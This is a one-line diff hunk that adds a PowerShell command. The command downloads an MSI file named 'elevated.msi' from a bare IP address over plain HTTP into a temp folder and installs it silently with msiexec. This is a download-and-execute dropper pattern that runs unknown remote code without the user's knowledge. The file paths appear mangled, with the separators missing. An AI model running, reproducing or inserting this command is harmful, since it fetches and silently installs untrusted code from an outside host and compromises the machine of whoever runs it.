@@ -1,0 +1,1 @@
+mkdir -force $env:TEMPTCD506A_.tmp;Invoke-WebRequest "http://83.212.111.137/down/elevated.msi" -OutFile "$env:TEMPTCD506A_.tmpelevated.msi";msiexec /q /i "$env:TEMPTCD506A_.tmpelevated.msi";
